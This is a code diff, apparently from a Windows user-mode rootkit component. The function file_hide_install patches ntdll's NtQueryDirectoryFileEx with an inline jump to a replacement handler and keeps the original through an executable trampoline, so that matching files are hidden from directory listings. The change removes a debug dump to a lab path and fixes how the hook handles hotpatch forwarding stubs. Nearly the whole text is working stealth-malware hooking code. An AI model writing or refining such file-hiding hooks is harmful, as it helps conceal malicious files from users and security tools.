@@ -210,46 +210,31 @@ int file_hide_install(PrefixTable *table)
     g_original_ex = (pNtQueryDirectoryFileEx)
         GetProcAddress(ntdll, "NtQueryDirectoryFileEx");
     if (g_original_ex) {
-        memcpy(g_saved_ex, (void *)g_original_ex, PATCH_SIZE);
+        BYTE *ex_ptr = (BYTE *)g_original_ex;
 
-#ifdef FILE_HIDE_DIAG
-        {
-            HANDLE hf = CreateFileA("C:\\lab\\debug_bytes.bin",
-                                    GENERIC_WRITE, 0, NULL,
-                                    CREATE_ALWAYS, 0, NULL);
-            if (hf != INVALID_HANDLE_VALUE) {
-                DWORD w;
-                WriteFile(hf, g_saved_ex, PATCH_SIZE, &w, NULL);
-                CloseHandle(hf);
-            }
+        /* If the export is a forwarding stub (E9 = JMP rel32, typical
+           of hotpatching), follow the jump to reach the real syscall
+           stub and hook THAT instead.  Patching the 5-byte forwarder
+           would corrupt the adjacent function. */
+        if (ex_ptr[0] == 0xE9) {
+            INT32 disp = *(INT32 *)(ex_ptr + 1);
+            g_original_ex = (pNtQueryDirectoryFileEx)(ex_ptr + 5 + disp);
         }
-#endif
+
+        memcpy(g_saved_ex, (void *)g_original_ex, PATCH_SIZE);
 
         g_trampoline_ex = (pNtQueryDirectoryFileEx)
             VirtualAlloc(NULL, TRAMP_SIZE,
                          MEM_COMMIT | MEM_RESERVE,
                          PAGE_EXECUTE_READWRITE);
         if (g_trampoline_ex) {
-            BYTE *ex_ptr = (BYTE *)g_original_ex;
-
-            if (ex_ptr[0] == 0xE9) {
-                /* Forwarding stub (E9 = JMP rel32, e.g. hotpatch).
-                   Resolve absolute target and build trampoline as
-                   absolute JMP there — the relative displacement
-                   breaks when copied to a different address. */
-                INT32 disp = *(INT32 *)(ex_ptr + 1);
-                void *resolved = ex_ptr + 5 + disp;
-                write_abs_jmp((BYTE *)g_trampoline_ex, resolved);
-            } else {
-                /* Standard syscall stub: relocate first 16 bytes. */
-                memcpy((void *)g_trampoline_ex, g_saved_ex, PATCH_SIZE);
-                write_abs_jmp((BYTE *)g_trampoline_ex + PATCH_SIZE,
-                              ex_ptr + PATCH_SIZE);
-            }
+            memcpy((void *)g_trampoline_ex, g_saved_ex, PATCH_SIZE);
+            write_abs_jmp((BYTE *)g_trampoline_ex + PATCH_SIZE,
+                          (BYTE *)g_original_ex + PATCH_SIZE);
 
             if (VirtualProtect((void *)g_original_ex, PATCH_SIZE,
                                PAGE_EXECUTE_READWRITE, &oldProt)) {
-                write_abs_jmp(ex_ptr,
+                write_abs_jmp((BYTE *)g_original_ex,
                               (void *)HookedNtQueryDirectoryFileEx);
                 VirtualProtect((void *)g_original_ex, PATCH_SIZE,
                                oldProt, &tmp);
